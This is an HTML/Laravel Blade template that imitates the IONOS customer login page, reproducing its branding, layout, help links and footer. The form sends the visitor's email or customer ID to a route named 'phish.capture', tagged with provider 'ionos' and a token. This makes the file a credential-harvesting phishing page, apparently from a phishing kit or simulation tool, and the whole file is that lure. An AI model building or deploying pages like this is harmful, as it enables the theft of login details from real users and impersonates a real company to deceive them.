<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>IONOS Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #f4f7fa;
            color: #001b41;
            min-height: 100vh;
        }

        header {
            display: flex;
            align-items: center;
            padding: 16px 0 16px 99px;
            background: #fff;
            border-bottom: 1px solid #e8ecf0;
            height: 64px;
        }

        .logo {
            font-size: 21.5px;
            font-weight: 700;
            color: #003d8e;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            background: #003d8e;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 14px;
            font-weight: 700;
        }

        .content-wrapper {
            max-width: 1366px;
            margin: 0 auto;
        }

        .sheet {
            background: #fff;
            border-radius: 8px;
            width: 650px;
            margin: 32px auto 0;
            position: relative;
        }

        .sheet-inner {
            padding: 46px 30px 60px;
        }

        h1 {
            font-size: 22px;
            font-weight: 400;
            color: #001b41;
            margin-bottom: 59px;
            padding-left: 73px;
        }

        .field-group {
            margin-bottom: 4px;
        }

        .field-group label {
            display: block;
            font-size: 14px;
            font-weight: 400;
            color: #02102b;
            margin-bottom: 6px;
        }

        .field-group input {
            width: 100%;
            height: 44px;
            padding: 0 12px;
            font-size: 14px;
            font-family: inherit;
            color: #001b41;
            background: #fff;
            border: 1px solid #b0b8c4;
            border-radius: 4px;
            outline: none;
        }

        .field-group input:focus {
            border-color: #1474c4;
            box-shadow: 0 0 0 1px #1474c4;
        }

        .forgot-links {
            margin-bottom: 20px;
        }

        .forgot-links a {
            display: block;
            font-size: 14px;
            color: #1474c4;
            text-decoration: none;
            margin-bottom: 4px;
        }

        .forgot-links a:hover { text-decoration: underline; }

        .btn-next {
            width: 100%;
            height: 44px;
            font-size: 14px;
            font-family: inherit;
            color: #fff;
            background: #003d8e;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 58px;
        }

        .btn-next:hover { background: #002d6b; }

        .not-customer {
            text-align: left;
            font-size: 14px;
            color: #001b41;
            margin-bottom: 8px;
        }

        .become-customer {
            text-align: left;
            font-size: 14px;
            color: #1474c4;
            text-decoration: none;
        }

        .become-customer:hover { text-decoration: underline; }

        .more-logins {
            background: #fff;
            border-radius: 8px;
            width: 650px;
            margin: 0 auto 0;
            padding: 32px 0 40px;
        }

        .more-logins h2 {
            font-size: 16px;
            font-weight: 400;
            color: #001b41;
            margin-bottom: 24px;
        }

        .login-links {
            display: flex;
            padding-left: 64px;
            gap: 149px;
        }

        .login-links a {
            font-size: 16px;
            color: #1474c4;
            text-decoration: none;
        }

        .login-links a:hover { text-decoration: underline; }

        footer {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 40px 52px;
            font-size: 14px;
            color: #001b41;
            max-width: 1366px;
            margin: 152px auto 0;
        }

        .footer-left {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            background: #22c55e;
            border-radius: 50%;
        }

        .footer-right {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .footer-right a {
            color: #001b41;
            text-decoration: none;
        }

        .footer-right a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header>
        <a href="#" class="logo">
            <div class="logo-icon">I</div>
            Login
        </a>
    </header>

    <div class="content-wrapper">
        <div class="sheet">
            <div class="sheet-inner">
                <h1>My IONOS Login</h1>

                <form method="POST" action="{{ route('phish.capture', ['provider' => 'ionos', 'token' => $token ?? '']) }}">
                    @csrf
                    <input type="hidden" name="_token" value="{{ csrf_token() }}">

                    <div class="field-group">
                        <label>Customer ID, email address or domain</label>
                        <input type="text" name="email" required autocomplete="username" autofocus>
                    </div>

                    <div class="forgot-links">
                        <a href="#">Forgot your login details?</a>
                        <a href="#">Forgot Your Password?</a>
                    </div>

                    <button type="submit" class="btn-next">Next</button>
                </form>

                <div class="not-customer">Not an IONOS customer yet?</div>
                <a href="#" class="become-customer">Become a customer now and benefit from our offers.</a>
            </div>
        </div>

        <div class="more-logins">
            <h2>More IONOS Logins</h2>
            <div class="login-links">
                <a href="#">Webmail</a>
                <a href="#">Data Center Designer</a>
                <a href="#">HiDrive</a>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-left">
            <div class="status-dot"></div>
            All Systems Operational
        </div>
        <div class="footer-right">
            <span>© 2026</span>
            <span>IONOS Inc.</span>
            <a href="#">Privacy Policy</a>
            <span>-</span>
            <a href="#">T&Cs</a>
        </div>
    </footer>
</body>
</html>
